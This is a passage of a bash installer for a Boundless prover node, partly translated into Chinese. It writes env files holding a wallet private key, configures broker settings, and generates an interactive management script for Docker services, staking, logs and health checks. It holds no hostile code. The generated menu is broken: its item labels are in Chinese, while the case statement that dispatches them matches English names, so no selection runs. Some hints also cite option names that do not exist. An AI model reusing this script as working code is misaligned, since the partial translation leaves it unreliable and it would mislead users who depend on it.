    cat > "$INSTALL_DIR/.env.eth-sepolia" << EOF
export VERIFIER_ADDRESS=0x925d8331ddc0a1F0d96E68CF073DFE1d92b69187
export BOUNDLESS_MARKET_ADDRESS=0x13337C76fE2d1750246B68781ecEe164643b98Ec
export SET_VERIFIER_ADDRESS=0x7aAB646f23D1392d4522CFaB0b7FB5eaf6821d64
export ORDER_STREAM_URL="https://eth-sepolia.beboundless.xyz/"
export RPC_URL="$RPC_URL"
export PRIVATE_KEY=$PRIVATE_KEY
export SEGMENT_SIZE=$SEGMENT_SIZE
EOF
    chmod 600 "$INSTALL_DIR/.env.broker"
    chmod 600 "$INSTALL_DIR/.env.base"
    chmod 600 "$INSTALL_DIR/.env.base-sepolia"
    chmod 600 "$INSTALL_DIR/.env.eth-sepolia"
    success "Network configuration saved"
}

# Configure broker.toml
configure_broker() {
    info "配置代理配置..."
    cp "$INSTALL_DIR/broker-template.toml" "$BROKER_CONFIG"
    echo -e "\n${BOLD}代理配置:${RESET}"
    echo "配置关键参数 (按 Enter 保持默认):"
    echo -e "\n${CYAN}mcycle_price${RESET}: 每百万个周期原生代币的价格"
    echo "Lower = 更具有竞争力, 但利润更低"
    prompt "mcycle_price [默认: 0.0000005]: "
    read -r mcycle_price
    mcycle_price=${mcycle_price:-0.0000005}
    echo -e "\n${CYAN}peak_prove_khz${RESET}: 最大证明速度 (kHz)"
    echo "稍后, 通过管理脚本基准测试 GPU, 然后根据结果设置"
    prompt "peak_prove_khz [默认: 100]: "
    read -r peak_prove_khz
    peak_prove_khz=${peak_prove_khz:-100}
    echo -e "\n${CYAN}max_mcycle_limit${RESET}: 最大周期数 (百万)"
    echo "Higher = 接受更大的证明"
    prompt "max_mcycle_limit [默认: 8000]: "
    read -r max_mcycle_limit
    max_mcycle_limit=${max_mcycle_limit:-8000}
    echo -e "\n${CYAN}min_deadline${RESET}: 截止时间前的最小秒数"
    echo "Higher = 更安全, 但可能错过截止时间低于最小值的订单"
    prompt "min_deadline [默认: 300]: "
    read -r min_deadline
    min_deadline=${min_deadline:-300}
    echo -e "\n${CYAN}max_concurrent_proofs${RESET}: 最大并行证明"
    echo "Higher = 更多吞吐量, 但可能错过截止时间"
    prompt "max_concurrent_proofs [默认: 2]: "
    read -r max_concurrent_proofs
    max_concurrent_proofs=${max_concurrent_proofs:-2}
    echo -e "\n${CYAN}lockin_priority_gas${RESET}: 锁定交易额外 gas (Gwei)"
    echo "重要指标, 赢得其他 prover 的竞标订单"
    echo "Higher = 更好的赢得竞标机会"
    prompt "lockin_priority_gas [默认: 0]: "
    read -r lockin_priority_gas
    sed -i "s/mcycle_price = \"[^\"]*\"/mcycle_price = \"$mcycle_price\"/" "$BROKER_CONFIG"
    sed -i "s/peak_prove_khz = [0-9]*/peak_prove_khz = $peak_prove_khz/" "$BROKER_CONFIG"
    sed -i "s/max_mcycle_limit = [0-9]*/max_mcycle_limit = $max_mcycle_limit/" "$BROKER_CONFIG"
    sed -i "s/min_deadline = [0-9]*/min_deadline = $min_deadline/" "$BROKER_CONFIG"
    sed -i "s/max_concurrent_proofs = [0-9]*/max_concurrent_proofs = $max_concurrent_proofs/" "$BROKER_CONFIG"
    if [[ -n "$lockin_priority_gas" ]]; then
        sed -i "s/#lockin_priority_gas = [0-9]*/lockin_priority_gas = $lockin_priority_gas/" "$BROKER_CONFIG"
    fi
    success "代理配置保存完成"
}

# Create management script
create_management_script() {
    info "创建管理脚本..."
    cat > "$INSTALL_DIR/prover.sh" << 'EOF'
#!/bin/bash

export PATH="$HOME/.cargo/bin:$PATH"

INSTALL_DIR="$(dirname "$0")"
cd "$INSTALL_DIR"

# 颜色变量
CYAN='\033[0;36m'
LIGHTBLUE='\033[1;34m'
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
ORANGE='\033[0;33m'
BOLD='\033[1m'
RESET='\033[0m'
GRAY='\033[0;90m'

# 菜单选项
declare -a menu_items=(
    "SERVICE:服务管理"
    "启动代理"
    "启动 Bento (测试用)"
    "停止服务"
    "查看日志"
    "健康检查"
    "SEPARATOR:"
    "CONFIG:配置"
    "切换网络"
    "切换私钥"
    "编辑代理配置"
    "SEPARATOR:"
    "STAKE:质押管理"
    "质押"
    "检查质押余额"
    "SEPARATOR:"
    "BENCH:性能测试"
    "运行基准测试 (订单 ID)"
    "SEPARATOR:"
    "MONITOR:监控"
    "监控 GPU"
    "SEPARATOR:"
    "退出"
)

# 绘制菜单
draw_menu() {
    local current=$1
    clear
    echo -e "${BOLD}${CYAN}╔══════════════════════════════════════════╗${RESET}"
    echo -e "${BOLD}${CYAN}║      Boundless Prover Management         ║${RESET}"
    echo -e "${BOLD}${CYAN}╚══════════════════════════════════════════╝${RESET}"
    echo

    local index=0
    for item in "${menu_items[@]}"; do
        if [[ $item == *":"* ]]; then
            if [[ $item == "SEPARATOR:" ]]; then
                echo -e "${GRAY}──────────────────────────────────────────${RESET}"
            else
                local category=$(echo $item | cut -d: -f1)
                local desc=$(echo $item | cut -d: -f2)
                case $category in
                    "SERVICE")
                        echo -e "\n${BOLD}${GREEN}▶ $desc${RESET}"
                        ;;
                    "CONFIG")
                        echo -e "\n${BOLD}${YELLOW}▶ $desc${RESET}"
                        ;;
                    "STAKE")
                        echo -e "\n${BOLD}${PURPLE}▶ $desc${RESET}"
                        ;;
                    "BENCH")
                        echo -e "\n${BOLD}${ORANGE}▶ $desc${RESET}"
                        ;;
                    "MONITOR")
                        echo -e "\n${BOLD}${LIGHTBLUE}▶ $desc${RESET}"
                        ;;
                esac
            fi
        else
            if [ $index -eq $current ]; then
                echo -e "  ${BOLD}${CYAN}→ $item${RESET}"
            else
                echo -e "    $item"
            fi
            ((index++))
        fi
    done
    echo
    echo -e "${GRAY}Use ↑/↓ arrows to navigate, Enter to select, q to quit${RESET}"
}

# 获取实际菜单项 (不包括类别和分隔符)
get_menu_item() {
    local current=$1
    local index=0
    for item in "${menu_items[@]}"; do
        if [[ ! $item == *":"* ]]; then
            if [ $index -eq $current ]; then
                echo "$item"
                return
            fi
            ((index++))
        fi
    done
}

# 获取按键
get_key() {
    local key
    IFS= read -rsn1 key 2>/dev/null >&2
    if [[ $key = "" ]]; then echo enter; fi
    if [[ $key = $'\x1b' ]]; then
        read -rsn2 key
        if [[ $key = [A ]]; then echo up; fi
        if [[ $key = [B ]]; then echo down; fi
    fi
    if [[ $key = "q" ]] || [[ $key = "Q" ]]; then echo quit; fi
}

# 验证配置
validate_config() {
    local errors=0
    
    if [[ ! -f .env.broker ]]; then
        echo -e "${RED}✗ 配置文件 .env.broker 未找到${RESET}"
        ((errors++))
    else
        source .env.broker
        
        # 检查私钥
        if [[ ! "$PRIVATE_KEY" =~ ^[0-9a-fA-F]{64}$ ]]; then
            echo -e "${RED}✗ 无效的私钥格式${RESET}"
            ((errors++))
        fi
        
        # 检查 RPC URL
        if [[ -z "$RPC_URL" ]]; then
            echo -e "${RED}✗ RPC URL 未配置${RESET}"
            ((errors++))
        fi
        
        # 检查必需的地址
        if [[ -z "$BOUNDLESS_MARKET_ADDRESS" ]] || [[ -z "$SET_VERIFIER_ADDRESS" ]]; then
            echo -e "${RED}✗ 必需的合约地址未配置${RESET}"
            ((errors++))
        fi
    fi
    
    return $errors
}

# 箭头导航
arrow_menu() {
    local -a options=("$@")
    local current=0
    local key

    while true; do
        clear
        for i in "${!options[@]}"; do
            if [ $i -eq $current ]; then
                echo -e "${BOLD}${CYAN}→ ${options[$i]}${RESET}"
            else
                echo -e "  ${options[$i]}"
            fi
        done
        echo
        echo -e "${GRAY}使用 ↑/↓ 箭头导航, 按 Enter 选择, q 返回${RESET}"

        key=$(get_key)
        case $key in
            up)
                ((current--))
                if [ $current -lt 0 ]; then current=$((${#options[@]}-1)); fi
                ;;
            down)
                ((current++))
                if [ $current -ge ${#options[@]} ]; then current=0; fi
                ;;
            enter)
                return $current
                ;;
            quit)
                return 255
                ;;
        esac
    done
}

# 检查特定容器是否正在运行
is_container_running() {
    local container=$1
    local status=$(docker compose ps -q $container 2>/dev/null)
    if [[ -n "$status" ]]; then
        # 检查容器是否正在运行 (不是退出/重启)
        docker compose ps $container 2>/dev/null | grep -q "Up" && return 0
    fi
    return 1
}

# 获取容器退出状态
get_container_exit_code() {
    local container=$1
    docker compose ps $container 2>/dev/null | grep -oP 'Exit \K\d+' || echo "N/A"
}

# 检查所有容器状态
check_container_status() {
    local containers=("broker" "rest_api" "postgres" "redis" "minio" "gpu_prove_agent0" "exec_agent0" "exec_agent1" "aux_agent" "snark_agent")
    local statuses=$(docker compose ps --format "table {{.Name}}\t{{.Status}}" 2>/dev/null)
    local has_issues=false
    
    for container in "${containers[@]}"; do
        if ! echo "$statuses" | grep -q "^$container.*Up"; then
            has_issues=true
            break
        fi
    done
    
    if [[ "$has_issues" == true ]]; then
        echo -e "${RED}${BOLD}⚠ 警告: 某些容器未正常运行${RESET}"
        echo -e "${YELLOW}选择 'Container status' 查看详细信息${RESET}\n"
    fi
}

# 显示详细容器状态
show_container_status() {
    clear
    echo -e "${BOLD}${CYAN}容器状态概览${RESET}"
    echo -e "${GRAY}════════════════════════════════════════${RESET}\n"
    
    # 从 compose 获取所有容器
    local containers=$(docker compose ps --format "table {{.Name}}\t{{.Status}}\t{{.Service}}" 2>/dev/null | tail -n +2)
    
    if [[ -z "$containers" ]]; then
        echo -e "${RED}未找到容器. 服务可能未启动.${RESET}"
    else
        # 标题
        printf "%-30s %-20s %s\n" "CONTAINER" "STATUS" "SERVICE"
        echo -e "${GRAY}────────────────────────────────────────────────────────────${RESET}"
        
        # 处理每个容器
        while IFS= read -r line; do
            local name=$(echo "$line" | awk '{print $1}')
            local status=$(echo "$line" | awk '{$1=""; print $0}' | sed 's/^ *//')
            local service=$(echo "$line" | awk '{print $NF}')
            
            # 根据状态着色
            if echo "$status" | grep -q "Up"; then
                printf "${GREEN}%-30s${RESET} %-20s %s\n" "$name" "✓ Running" "$service"
            elif echo "$status" | grep -q "Exit"; then
                printf "${RED}%-30s${RESET} ${RED}%-20s${RESET} %s\n" "$name" "✗ Exited" "$service"
                # Show last error for exited containers
                if [[ "$service" == "broker" ]]; then
                    echo -e "${YELLOW}  └─ Last error: $(docker compose logs --tail=1 broker 2>&1 | grep -oE 'error:.*' | head -1)${RESET}"
                fi
            elif echo "$status" | grep -q "Restarting"; then
                printf "${YELLOW}%-30s${RESET} ${YELLOW}%-20s${RESET} %s\n" "$name" "↻ Restarting" "$service"
            else
                printf "%-30s %-20s %s\n" "$name" "$status" "$service"
            fi
        done <<< "$containers"
    fi
    
    echo -e "\n${GRAY}按任意键继续...${RESET}"
    read -n 1
}

# 分析常见代理错误
analyze_broker_errors() {
    local last_errors=$(docker compose logs --tail=100 broker 2>&1 | grep -i "error" | tail -5)
    
    if [[ -z "$last_errors" ]]; then
        return
    fi
    
    echo -e "\n${BOLD}${YELLOW}检测到问题:${RESET}"
    
    # 检查每个错误模式
    if echo "$last_errors" | grep -q "odd number of digits"; then
        echo -e "${RED}✗ Invalid private key format${RESET}"
        echo -e "  ${YELLOW}→ Private key should be 64 hex characters (without 0x prefix)${RESET}"
        echo -e "  ${YELLOW}→ Use 'Change Private Key' option to fix${RESET}"
    fi
    
    if echo "$last_errors" | grep -q "connection refused"; then
        echo -e "${RED}✗ Connection refused${RESET}"
        echo -e "  ${YELLOW}→ Check if all required services are running${RESET}"
        echo -e "  ${YELLOW}→ Verify RPC URL is accessible${RESET}"
    fi
    
    if echo "$last_errors" | grep -q "insufficient funds"; then
        echo -e "${RED}✗ Insufficient funds${RESET}"
        echo -e "  ${YELLOW}→ Check wallet balance for gas${RESET}"
        echo -e "  ${YELLOW}→ Ensure USDC stake is deposited${RESET}"
    fi
    
    if echo "$last_errors" | grep -q "RPC.*error\|eth_.*not supported"; then
        echo -e "${RED}✗ RPC connection issue${RESET}"
        echo -e "  ${YELLOW}→ Verify RPC URL is correct and accessible${RESET}"
        echo -e "  ${YELLOW}→ Check if RPC supports eth_newBlockFilter${RESET}"
        echo -e "  ${YELLOW}→ Consider using BlockPi, Alchemy, or your own node${RESET}"
    fi
    
    if echo "$last_errors" | grep -q "database.*connection\|postgres"; then
        echo -e "${RED}✗ Database connection issue${RESET}"
        echo -e "  ${YELLOW}→ Check if postgres container is running${RESET}"
        echo -e "  ${YELLOW}→ Try restarting all services${RESET}"
    fi
    
    if echo "$last_errors" | grep -q "stake.*required\|minimum.*stake"; then
        echo -e "${RED}✗ Insufficient stake${RESET}"
        echo -e "  ${YELLOW}→ Use 'Deposit Stake' option to add USDC stake${RESET}"
        echo -e "  ${YELLOW}→ Check minimum stake requirements${RESET}"
    fi
    
    if echo "$last_errors" | grep -q "invalid.*address\|checksum"; then
        echo -e "${RED}✗ Invalid contract address${RESET}"
        echo -e "  ${YELLOW}→ Network configuration may be corrupted${RESET}"
        echo -e "  ${YELLOW}→ Try switching networks and back${RESET}"
    fi
    
    # 显示实际的错误行以进行调试
    echo -e "\n${GRAY}Last error messages:${RESET}"
    echo "$last_errors" | while IFS= read -r line; do
        echo -e "${GRAY}  $line${RESET}"
    done
}

# 查看代理日志并进行适当的处理
view_broker_logs() {
    clear
    echo -e "${CYAN}${BOLD}代理日志${RESET}"
    echo -e "${GRAY}════════════════════════════════════════${RESET}\n"
    
    if is_container_running "broker"; then
        echo -e "${GREEN}Broker is running. Showing live logs (press Ctrl+C to exit)...${RESET}\n"
        docker compose logs -f broker
    else
        echo -e "${RED}${BOLD}⚠ Broker container is not running!${RESET}"
        echo -e "${YELLOW}Showing available logs...${RESET}\n"
        
        # Show historical logs
        docker compose logs broker 2>&1 || echo -e "${RED}No logs available for broker${RESET}"
        
        # Analyze errors
        echo -e "\n${GRAY}────────────────────────────────────────${RESET}"
        analyze_broker_errors
    fi
}

# 查看最后 100 行代理日志并进行适当的处理
view_broker_logs_tail() {
    clear
    echo -e "${CYAN}${BOLD}最后 100 行代理日志${RESET}"
    echo -e "${GRAY}════════════════════════════════════════${RESET}\n"
    
    if is_container_running "broker"; then
        echo -e "${GREEN}代理正在运行. 显示最后 100 行并继续显示日志 (按 Ctrl+C 退出)...${RESET}\n"
        docker compose logs --tail=100 -f broker
    else
        echo -e "${RED}${BOLD}⚠ 代理容器未运行!${RESET}"
        echo -e "${YELLOW}Showing last 100 lines of logs...${RESET}\n"
        
        # Show last 100 lines of historical logs
        docker compose logs --tail=100 broker 2>&1 || echo -e "${RED}No logs available for broker${RESET}"
        
        # Analyze errors
        echo -e "\n${GRAY}────────────────────────────────────────${RESET}"
        analyze_broker_errors
    fi
}

# 增强的 view_logs 函数, 更好的容器状态处理
view_logs() {
    echo -e "${BOLD}${CYAN}日志查看器${RESET}"
    echo -e "${GRAY}──────────────────${RESET}"

    # 首先检查容器状态
    check_container_status

    local options=("All logs" "Broker logs only" "Last 100 broker logs" "Container status" "Back to menu")
    arrow_menu "${options[@]}"
    local choice=$?

    case $choice in
        0) # All logs
            clear
            echo -e "${CYAN}${BOLD}显示所有日志 (按 Ctrl+C 退出)...${RESET}\n"
            just broker logs
            ;;
        1) # Broker logs only
            view_broker_logs
            ;;
        2) # Last 100 broker logs
            view_broker_logs_tail
            ;;
        3) # Container status
            show_container_status
            ;;
        4|255) return ;;
    esac
}

# 更新 start_broker 函数, 更好的错误处理
start_broker() {
    clear
    
    # Validate configuration first
    echo -e "${CYAN}${BOLD}验证配置...${RESET}"
    if ! validate_config; then
        echo -e "\n${RED}配置验证失败!${RESET}"
        echo -e "${YELLOW}请在启动代理之前修复上述问题.${RESET}"
        echo -e "\n按任意键返回菜单..."
        read -n 1
        return
    fi
    
    source .env.broker
    
    echo -e "${GREEN}✓ 配置验证成功${RESET}"
    echo -e "\n${GREEN}${BOLD}启动代理...${RESET}"
    
    # 启动服务
    just broker
    
    # 给容器时间启动
    sleep 3
    
    # 检查代理是否成功启动
    if ! is_container_running "broker"; then
        echo -e "\n${RED}${BOLD}⚠ 代理启动失败!${RESET}"
        echo -e "${YELLOW}检查日志中的错误...${RESET}\n"
        docker compose logs --tail=20 broker
        analyze_broker_errors
        echo -e "\n按任意键返回菜单..."
        read -n 1
    fi
}

start_bento() {
    clear
    echo -e "${GREEN}${BOLD}启动 bento 进行测试...${RESET}"
    just bento
}

stop_services() {
    clear
    echo -e "${YELLOW}${BOLD}停止服务...${RESET}"
    just broker down
    echo -e "\n${GREEN}服务已停止. 按任意键继续...${RESET}"
    read -n 1
}

change_network() {
    echo -e "${BOLD}${YELLOW}Network Selection${RESET}"
    echo -e "${GRAY}──────────────────${RESET}"

    local options=("Base Mainnet" "Base Sepolia" "Ethereum Sepolia" "Back to menu")
    arrow_menu "${options[@]}"
    local choice=$?

    # 在更改网络之前获取当前 SEGMENT_SIZE
    if [[ -f .env.broker ]]; then
        source .env.broker
        CURRENT_SEGMENT_SIZE=$SEGMENT_SIZE
    fi

    case $choice in
        0)
            cp .env.base .env.broker
            echo -e "${GREEN}Network changed to Base Mainnet.${RESET}"
            local selected_network="base"
            ;;
        1)
            cp .env.base-sepolia .env.broker
            echo -e "${GREEN}Network changed to Base Sepolia.${RESET}"
            local selected_network="base-sepolia"
            ;;
        2)
            cp .env.eth-sepolia .env.broker
            echo -e "${GREEN}Network changed to Ethereum Sepolia.${RESET}"
            local selected_network="eth-sepolia"
            ;;
        3|255) return ;;
    esac

    if [[ $choice -le 2 ]]; then
        # Preserve SEGMENT_SIZE in the new configuration
        if [[ -n "$CURRENT_SEGMENT_SIZE" ]]; then
            sed -i "s/export SEGMENT_SIZE=.*/export SEGMENT_SIZE=$CURRENT_SEGMENT_SIZE/" .env.broker
            sed -i "s/export SEGMENT_SIZE=.*/export SEGMENT_SIZE=$CURRENT_SEGMENT_SIZE/" .env.$selected_network
        fi

        # Ask for new RPC URL
        echo -e "\n${BOLD}新网络的 RPC 配置:${RESET}"
        echo "RPC 必须支持 eth_newBlockFilter. 推荐提供者:"
        echo "- BlockPi (Base 网络免费)"
        echo "- Alchemy"
        echo "- Chainstack (设置 lookback_blocks=0)"
        echo "- 你的节点"
        read -p "输入 RPC URL: " new_rpc

        if [[ -n "$new_rpc" ]]; then
            # Update RPC URL in both files
            sed -i "s|export RPC_URL=.*|export RPC_URL=\"$new_rpc\"|" .env.broker
            sed -i "s|export RPC_URL=.*|export RPC_URL=\"$new_rpc\"|" .env.$selected_network
            echo -e "${GREEN}RPC URL 已更新.${RESET}"
        fi

        echo -e "${YELLOW}请重启代理以使更改生效.${RESET}"
        echo -e "\n按任意键继续..."
        read -n 1
    fi
}

change_private_key() {
    clear
    echo -e "${BOLD}${YELLOW}切换私钥${RESET}"
    echo -e "${GRAY}──────────────────${RESET}"
    echo -e "${RED}警告: 这将更新所有网络文件中的私钥.${RESET}"
    echo
    read -sp "输入新的私钥 (不带 0x 前缀): " new_key
    echo

    if [[ -z "$new_key" ]]; then
        echo -e "${RED}私钥不能为空. 操作已取消.${RESET}"
        echo -e "\n按任意键继续..."
        read -n 1
        return
    fi

    # Validate private key format
    if [[ ! "$new_key" =~ ^[0-9a-fA-F]{64}$ ]]; then
        echo -e "${RED}无效的私钥格式!${RESET}"
        echo -e "${YELLOW}私钥必须为 64 个十六进制字符 (不带 0x 前缀)${RESET}"
        echo -e "${YELLOW}你输入了: ${#new_key} 个字符${RESET}"
        echo -e "\n按任意键继续..."
        read -n 1
        return
    fi

    # Update all env files
    for env_file in .env.broker .env.base .env.base-sepolia .env.eth-sepolia; do
        if [[ -f "$env_file" ]]; then
            sed -i "s/export PRIVATE_KEY=.*/export PRIVATE_KEY=$new_key/" "$env_file"
        fi
    done

    echo -e "\n${GREEN}私钥已成功更新到所有网络文件.${RESET}"
    echo -e "${YELLOW}请重启服务以使更改生效.${RESET}"
    echo -e "\n按任意键继续..."
    read -n 1
}

edit_broker_config() {
    clear
    nano broker.toml
}

deposit_stake() {
    clear
    source .env.broker
    echo -e "${BOLD}${PURPLE}质押 USDC${RESET}"
    echo -e "${GRAY}──────────────────${RESET}"
    read -p "输入质押金额 (USDC): " amount
    if [[ -n "$amount" ]]; then
        boundless account deposit-stake "$amount"
        echo -e "\n按任意键继续..."
        read -n 1
    fi
}

check_balance() {
    clear
    source .env.broker
    echo -e "${BOLD}${PURPLE}质押余额${RESET}"
    echo -e "${GRAY}──────────────────${RESET}"
    boundless account stake-balance
    echo -e "\n按任意键继续..."
    read -n 1
}

run_benchmark_orders() {
    clear
    source .env.broker
    echo -e "${BOLD}${ORANGE}基准测试 (订单 ID)${RESET}"
    echo -e "${GRAY}──────────────────${RESET}"
    echo "从 https://explorer.beboundless.xyz/orders 输入订单 ID"
    read -p "订单 ID (逗号分隔): " ids
    if [[ -n "$ids" ]]; then
        boundless proving benchmark --request-ids "$ids"
        echo -e "\n按任意键继续..."
        read -n 1
    fi
}

monitor_gpus() {
    clear
    nvtop
}

# 全面的健康检查
health_check() {
    clear
    echo -e "${BOLD}${CYAN}系统健康检查${RESET}"
    echo -e "${GRAY}════════════════════════════════════════${RESET}\n"
    
    # 1. Configuration check
    echo -e "${BOLD}1. Configuration Status:${RESET}"
    if validate_config > /dev/null 2>&1; then
        echo -e "   ${GREEN}✓ 配置有效${RESET}"
        source .env.broker
        echo -e "   ${GRAY}Network: $(grep ORDER_STREAM_URL .env.broker | cut -d'/' -f3 | cut -d'.' -f1)${RESET}"
        echo -e "   ${GRAY}Wallet: ${PRIVATE_KEY:0:6}...${PRIVATE_KEY: -4}${RESET}"
    else
        echo -e "   ${RED}✗ 配置问题检测到${RESET}"
        validate_config
    fi
    
    # 2. Container status
    echo -e "\n${BOLD}2. 服务状态:${RESET}"
    local critical_services=("broker" "rest_api" "postgres" "redis" "minio")
    local all_healthy=true
    
    for service in "${critical_services[@]}"; do
        if is_container_running "$service"; then
            echo -e "   ${GREEN}✓ $service${RESET}"
        else
            echo -e "   ${RED}✗ $service${RESET}"
            all_healthy=false
        fi
    done
    
    # 3. GPU status
    echo -e "\n${BOLD}3. GPU Status:${RESET}"
    if command -v nvidia-smi > /dev/null 2>&1; then
        local gpu_count=$(nvidia-smi -L 2>/dev/null | wc -l)
        if [[ $gpu_count -gt 0 ]]; then
            echo -e "   ${GREEN}✓ $gpu_count GPU(s) detected${RESET}"
            # Show GPU utilization
            nvidia-smi --query-gpu=index,name,utilization.gpu,memory.used,memory.total --format=csv,noheader,nounits 2>/dev/null | while IFS=',' read -r idx name util mem_used mem_total; do
                echo -e "   ${GRAY}GPU $idx: $name - ${util}% utilized, ${mem_used}MB/${mem_total}MB${RESET}"
            done
        else
            echo -e "   ${RED}✗ 未检测到 GPU${RESET}"
        fi
    else
        echo -e "   ${RED}✗ nvidia-smi 未找到${RESET}"
    fi
    
    # 4. Network connectivity
    echo -e "\n${BOLD}4. 网络状态:${RESET}"
    if [[ -n "$RPC_URL" ]]; then
        echo -e "   ${GRAY}测试 RPC 连接...${RESET}"
        if curl -s -X POST "$RPC_URL" \
            -H "Content-Type: application/json" \
            -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' \
            --connect-timeout 5 > /dev/null 2>&1; then
            echo -e "   ${GREEN}✓ RPC 连接成功${RESET}"
        else
            echo -e "   ${RED}✗ RPC 连接失败${RESET}"
        fi
    else
        echo -e "   ${RED}✗ RPC URL not configured${RESET}"
    fi
    
    # 5. Overall status
    echo -e "\n${BOLD}5. 整体状态:${RESET}"
    if [[ "$all_healthy" == true ]] && validate_config > /dev/null 2>&1; then
        echo -e "   ${GREEN}✓ 系统健康且准备就绪${RESET}"
    else
        echo -e "   ${YELLOW}⚠ Issues detected - check details above${RESET}"
    fi
    
    echo -e "\n${GRAY}Press any key to continue...${RESET}"
    read -n 1
}

# Initial container status check on startup
echo -e "${CYAN}Checking service status...${RESET}"
if docker compose ps 2>/dev/null | grep -q "broker"; then
    if ! is_container_running "broker"; then
        echo -e "\n${RED}${BOLD}⚠ Broker container is not running properly!${RESET}"
        echo -e "${YELLOW}Check logs to see what went wrong.${RESET}"
        sleep 2
    fi
fi

# 主菜单循环
current=0
menu_count=0

# 计算实际菜单项
for item in "${menu_items[@]}"; do
    if [[ ! $item == *":"* ]]; then
        ((menu_count++))
    fi
done

while true; do
    draw_menu $current
    key=$(get_key)

    case $key in
        up)
            ((current--))
            if [ $current -lt 0 ]; then current=$((menu_count-1)); fi
            ;;
        down)
            ((current++))
            if [ $current -ge $menu_count ]; then current=0; fi
            ;;
        enter)
            selected=$(get_menu_item $current)
            case "$selected" in
                "Start Broker") start_broker ;;
                "Start Bento (testing only)") start_bento ;;
                "Stop Services") stop_services ;;
                "View Logs") view_logs ;;
                "Health Check") health_check ;;
                "Change Network") change_network ;;
                "Change Private Key") change_private_key ;;
                "Edit Broker Config") edit_broker_config ;;
                "Deposit Stake") deposit_stake ;;
                "Check Stake Balance") check_balance ;;
                "Run Benchmark (Order IDs)") run_benchmark_orders ;;
                "Monitor GPUs") monitor_gpus ;;
                "Exit")
                    clear
                    echo -e "${GREEN}再见!${RESET}"
                    exit 0
                    ;;
            esac
            ;;
        quit)
            clear
            echo -e "${GREEN}再见!${RESET}"
            exit 0
            ;;
    esac
done
EOF
    chmod +x "$INSTALL_DIR/prover.sh"
    success "Management script created at $INSTALL_DIR/prover.sh"
}

# Main installation flow
main() {
    echo -e "${BOLD}${CYAN}Boundless Prover Node Setup${RESET}"
    echo "========================================"
    mkdir -p "$(dirname "$LOG_FILE")"
    touch "$LOG_FILE"
    touch "$ERROR_LOG"
    echo "[START] Installation started at $(date)" >> "$LOG_FILE"
    echo "[START] Installation started at $(date)" >> "$ERROR_LOG"
    info "Logs will be saved to:"
    info "  - Full log: cat $LOG_FILE"
    info "  - Error log: cat $ERROR_LOG"
    echo
    if [[ $EUID -eq 0 ]]; then
        if [[ "$ALLOW_ROOT" == "true" ]]; then
            warning "Running as root (allowed via --allow-root)"
        else
            warning "Running as root user"
            prompt "Continue? (y/N): "
            read -r response
            if [[ ! "$response" =~ ^[yY]$ ]]; then
                exit $EXIT_USER_ABORT
            fi
        fi
    else
        warning "这个脚本需要 root 权限或具有适当权限的用户"
        info "请确保您具有安装软件包和修改系统设置的必要权限"
    fi
    check_os
    update_system
    info "安装所有依赖..."
    install_basic_deps
    # install_gpu_drivers
    install_docker
    install_nvidia_toolkit
    install_rust
    install_just
    # install_cuda
    install_rust_deps
    clone_repository
    detect_gpus
    configure_compose
    configure_network
    configure_broker
    create_management_script
    echo -e "\n${GREEN}${BOLD}安装完成!${RESET}"
    echo "[SUCCESS] 安装完成成功 at $(date)" >> "$LOG_FILE"
    echo -e "\n${BOLD}下一步:${RESET}"
    echo "1. 您现在可以通过脚本管理您的 Prover 节点"
    echo "2. 导航到: cd $INSTALL_DIR"
    echo "3. 运行管理脚本: ./prover.sh"
    echo "4. 确保您使用管理脚本质押 USDC"
    echo -e "\n${YELLOW}重要:${RESET} 启动时始终检查日志!"
    echo "GPU 监控: nvtop"
    echo "系统监控: htop"
    echo -e "\n${CYAN}脚本的安装日志保存到:${RESET}"
    echo "  - $LOG_FILE"
    echo "  - $ERROR_LOG"
    echo -e "\n${YELLOW}安全注意:${RESET}"
    echo "您的私钥存储在 $INSTALL_DIR/.env.* 文件中."
    echo "确保这些文件不被未经授权的用户访问."
    echo "当前权限设置为 600 (仅 owner 读写)."
    if [[ "$START_IMMEDIATELY" == "true" ]]; then
        cd "$INSTALL_DIR"
        ./prover.sh
    else
        prompt "现在去管理脚本吗? (y/N): "
        read -r start_now
        if [[ "$start_now" =~ ^[yY]$ ]]; then
            cd "$INSTALL_DIR"
            ./prover.sh
        fi
    fi
}

# Run main
main
